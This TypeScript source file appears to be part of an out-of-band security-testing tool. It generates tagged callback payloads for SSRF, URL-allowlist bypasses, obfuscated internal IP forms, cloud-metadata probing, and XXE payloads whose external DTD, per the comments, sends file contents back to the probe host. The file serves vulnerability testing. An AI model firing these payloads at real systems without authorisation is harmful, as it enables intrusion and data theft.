// Payload kit generators (PLAN-KIT.md). Pure string building: nothing here sends anything.
//
// Every callback carries a variant code, written as the DNS label right before the probe's tag
// (ka1.fetch.<id>.<domain>) or, where only a path survives, as /k/<code>. The code shows up in the DNS
// lookup and the HTTP Host or path, so a hit says which payload fired. Codes are k + a section
// letter + a number: they never collide with tags users plant (the tag is always the label next to
// the id) and never decode as exfil (too short).

export type Section = "callbacks" | "bypass" | "address" | "ssrf" | "xxe";
export type Variant = { code: string; section: Section; name: string };
export type Payload = Variant & { text: string; note?: string };

export const SECTIONS: { id: Section | "metadata" | "gopher" | "xxe" | "xss" | "jndi" | "cmd"; label: string; ready: boolean }[] = [
  { id: "callbacks", label: "Callbacks", ready: true },
  { id: "bypass", label: "Allowlist bypass", ready: true },
  { id: "address", label: "Address forms", ready: true },
  { id: "metadata", label: "Cloud metadata", ready: true },
  { id: "gopher", label: "Gopher", ready: false },
  { id: "xxe", label: "XXE", ready: false },
  { id: "xss", label: "Blind XSS", ready: false },
  { id: "jndi", label: "JNDI", ready: false },
  { id: "cmd", label: "Command injection", ready: false },
];

// host: the payload host, <id>.<domain>. Plain-HTTP callbacks put the tag (and code) in labels; HTTPS
// keeps a single label in front of the domain (the certificate is a one-label wildcard), so the tag
// and code go in the path.
const sub = (code: string, tag: string, host: string) => `${code}.${tag}.${host}`;

export function callbacks(tag: string, host: string): Payload[] {
  const v = (code: string, name: string, text: string, note?: string): Payload => ({ code, section: "callbacks", name, text, note });
  return [
    v("kc1", "HTTP", `http://${sub("kc1", tag, host)}/`, "Also a DNS lookup of the name, so a target that resolves but can't connect still shows up."),
    v("kc2", "HTTPS", `https://${host}/${tag}/k/kc2`, "Tag and code in the path: the certificate covers one label."),
    v("kc3", "DNS name", sub("kc3", tag, host), "For fields that only take a hostname, or a resolve-only check."),
    v("kc4", "Protocol-relative", `//${sub("kc4", tag, host)}/`, "Takes the scheme of the page or request it lands in."),
    v("kc5", "Email address", `kc5@${tag}.${host}`, "Delivery arrives as an SMTP hit; the MX lookup comes first as DNS."),
    v("kc6", "UNC path", `\\\\${sub("kc6", tag, host)}\\k`, "Windows tries SMB; the lookup of the name shows up as DNS."),
    v("kc7", "file URL (UNC)", `file://${sub("kc7", tag, host)}/k`, "On Windows a file URL with a host goes out over SMB."),
    v("kc8", "FTP", `ftp://${sub("kc8", tag, host)}/k`, "Clients that follow ftp:// show up as at least a DNS lookup."),
  ];
}

// URL parser confusion (PortSwigger's URL validation bypass cheat sheet): the validator sees the
// expected host, the fetcher connects to the probe. Plain HTTP so the code can be a label (it then
// shows in the DNS lookup and in Host, and survives fragments and stripped paths).
export function bypasses(tag: string, host: string, expected: string): Payload[] {
  const e = expected.trim() || "api.shop.example";
  const p = (code: string) => sub(code, tag, host);
  const v = (code: string, name: string, text: string, note?: string): Payload => ({ code, section: "bypass", name, text, note });
  return [
    v("ka1", "Userinfo @", `http://${e}@${p("ka1")}/`, "The expected host is only a user name; the request goes to the probe."),
    v("ka2", "Userinfo with port", `http://${e}:80@${p("ka2")}/`, "For validators that strip a port before comparing."),
    v("ka3", "Fragment #@", `http://${p("ka3")}#@${e}/`, "A validator that takes the host after the last @ sees the expected host."),
    v("ka4", "Query ?@", `http://${p("ka4")}?@${e}/`, "Same trick through the query."),
    v("ka5", "Backslash", `http://${p("ka5")}\\@${e}/`, "Browsers and WHATWG parsers read \\ as /, so they connect to the probe; RFC 3986 parsers see the expected host."),
    v("ka6", "Expected host as a subdomain", `http://${e}.${p("ka6")}/`, "Beats \"starts with\" checks."),
    v("ka7", "Expected host in the path", `http://${p("ka7")}/${e}`, "Beats \"contains\" checks."),
    v("ka8", "Encoded @", `http://${e}%40${p("ka8")}/`, "For code that decodes before it parses."),
    v("ka9", "Unicode full stops", `http://${p("ka9").replace(/\./g, "。")}/`, "IDNA maps 。 to a dot after a string blocklist has looked."),
  ];
}

// ---------- address forms of an internal IPv4 target ----------
export function parseIPv4(s: string): number[] | null {
  const m = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(s.trim());
  if (!m) return null;
  const o = m.slice(1).map(Number);
  return o.every((n) => n <= 255) ? o : null;
}

const hex2 = (n: number) => n.toString(16).padStart(2, "0");
const oct = (n: number) => "0" + n.toString(8);

export type Form = { name: string; host: string; note?: string };

export function addressForms(ip: string): Form[] | null {
  const o = parseIPv4(ip);
  if (!o) return null;
  const [a, b, c, d] = o;
  const n = ((a << 24) >>> 0) + (b << 16) + (c << 8) + d;
  const dotted = o.join(".");
  const forms: Form[] = [
    { name: "Dotted", host: dotted },
    { name: "Decimal", host: String(n) },
    { name: "Hex", host: "0x" + n.toString(16).padStart(8, "0") },
    { name: "Octal, dotted", host: o.map(oct).join(".") },
    { name: "Hex, dotted", host: o.map((x) => "0x" + hex2(x)).join(".") },
    { name: "Mixed", host: `0x${hex2(a)}.${oct(b)}.${c}.${d}` },
    { name: "Two parts", host: `${a}.${(b << 16) + (c << 8) + d}` },
    { name: "Three parts", host: `${a}.${b}.${(c << 8) + d}` },
    { name: "IPv6, IPv4-mapped", host: `[::ffff:${dotted}]` },
    { name: "IPv6, mapped hex", host: `[::ffff:${hex2(a)}${hex2(b)}:${hex2(c)}${hex2(d)}]` },
    { name: "Wildcard DNS", host: `${dotted}.nip.io`, note: "Resolves to the address through nip.io, a third-party DNS service: the lookup tells them the address." },
    { name: "Wildcard DNS, dashes", host: `${o.join("-")}.nip.io`, note: "The same, for filters that reject a dotted IP inside a name." },
  ];
  if (a === 127) {
    forms.push(
      { name: "Zero", host: "0", note: "0.0.0.0 reaches local services on Linux and macOS." },
      { name: "IPv6 loopback", host: "[::1]" },
      { name: "localhost", host: "localhost" },
    );
  }
  return forms;
}

export const formUrl = (f: Form, path: string, scheme = "http") => `${scheme}://${f.host}${path.startsWith("/") ? path : "/" + path}`;

// ---------- plant presets (PLAN-PRESETS.md) ----------
// SSRF → cloud metadata: plain HTTP first (Java HttpURLConnection and Ruby open-uri won't follow an
// https → http redirect, and metadata is http).
export function ssrfPayloads(tag: string, host: string): Payload[] {
  const v = (code: string, name: string, text: string, note: string): Payload => ({ code, section: "ssrf", name, text, note });
  return [
    v("ks1", "First choice", `http://${sub("ks1", tag, host)}/`, "Use this one first: clients follow http → http redirects most reliably."),
    v("ks2", "Plausible path", `http://${sub("ks2", tag, host)}/latest/meta-data/`, "For filters that want a path that looks like the real thing."),
    v("ks3", "Over HTTPS", `https://${host}/${tag}/k/ks3`, "Java HttpURLConnection and Ruby open-uri won't follow https → http, so this one can stop at the first hop."),
  ];
}

// XXE: every row that loads the DTD (x.dtd) also brings the file back as a kx0 hit. HTTP, because the
// DTD's exfil URL is HTTP and some parsers won't mix schemes.
export function xxePayloads(tag: string, host: string): Payload[] {
  const v = (code: string, name: string, text: string, note: string): Payload => ({ code, section: "xxe", name, text, note });
  const dtd = (code: string) => `http://${sub(code, tag, host)}/x.dtd`;
  return [
    v("kx1", "DOCTYPE line", `<!DOCTYPE x SYSTEM "${dtd("kx1")}">`, "Put it after the <?xml ?> line of a document you control."),
    v("kx2", "Whole document", `<?xml version="1.0"?><!DOCTYPE x SYSTEM "${dtd("kx2")}"><x>1</x>`, "For a body or an upload that takes any XML."),
    v("kx3", "Parameter entity", `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % p SYSTEM "${dtd("kx3")}"> %p;]><x>1</x>`, "Loads the DTD as a parameter entity; for parsers that refuse an external DOCTYPE but allow entities."),
    v("kx4", "External entity", `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://${sub("kx4", tag, host)}/">]><x>&e;</x>`, "A plain callback through a general entity: proves resolution, reads nothing. Xerces controls this separately from external DTDs."),
    v("kx5", "XInclude", `<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://${sub("kx5", tag, host)}/"/></x>`, "When you only control one value inside a document the server builds."),
    v("kx6", "SVG upload", `<?xml version="1.0" standalone="no"?><!DOCTYPE svg SYSTEM "${dtd("kx6")}"><svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>`, "Image uploads that parse SVG server-side (thumbnails, converters)."),
    v("kx7", "Feed URL", `http://${sub("kx7", tag, host)}/feed.xml`, "For \"import from URL\" features: an RSS feed that pulls the DTD. /sitemap.xml works the same."),
  ];
}
// the hit that carries the file: the DTD sends it to kx0 (registered so the hit is named)
const XXE_DATA: Payload = { code: "kx0", section: "xxe", name: "File data from the DTD", text: "" };

// ---------- which payload a hit came from ----------
const ALL: Variant[] = [...callbacks("t", "h"), ...bypasses("t", "h", "e"), ...ssrfPayloads("t", "h"), ...xxePayloads("t", "h"), XXE_DATA].map(({ code, section, name }) => ({ code, section, name }));
const BY_CODE = new Map(ALL.map((v) => [v.code, v]));
export const SECTION_LABEL = { ...Object.fromEntries(SECTIONS.map((s) => [s.id, s.label])), ssrf: "SSRF → cloud metadata", xxe: "XXE" } as Record<string, string>;

// extraLabels: the labels in front of the tag (the code is the one right next to it). summary: the
// request line or SMTP summary. raw: the raw request, for an SMTP recipient.
export function variantOf(h: { extraLabels?: string[]; summary?: string; rawRequest?: string; protocol?: string }): Variant | null {
  const label = h.extraLabels?.at(-1);
  if (label && BY_CODE.has(label)) return BY_CODE.get(label)!;
  const path = /^[A-Z]+ \S*\/k\/(k[a-z]\d+)(?:[/?#\s]|$)/.exec(h.summary ?? "");
  if (path && BY_CODE.has(path[1])) return BY_CODE.get(path[1])!;
  if (h.protocol === "smtp") {
    const rcpt = /RCPT TO:\s*<?(k[a-z]\d+)@/i.exec(h.rawRequest ?? "");
    if (rcpt && BY_CODE.has(rcpt[1].toLowerCase())) return BY_CODE.get(rcpt[1].toLowerCase())!;
  }
  return null;
}

// ---------- encoding for a payload that goes inside a parameter ----------
export type Enc = "raw" | "once" | "twice";
// for a payload pasted into JSON or XML: escaped for that context, nothing else changed
export const jsonEscape = (s: string) => JSON.stringify(s).slice(1, -1);
export const xmlEscape = (s: string) => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&apos;");
export const encode = (s: string, e: Enc) => (e === "raw" ? s : e === "once" ? encodeURIComponent(s) : encodeURIComponent(encodeURIComponent(s)));
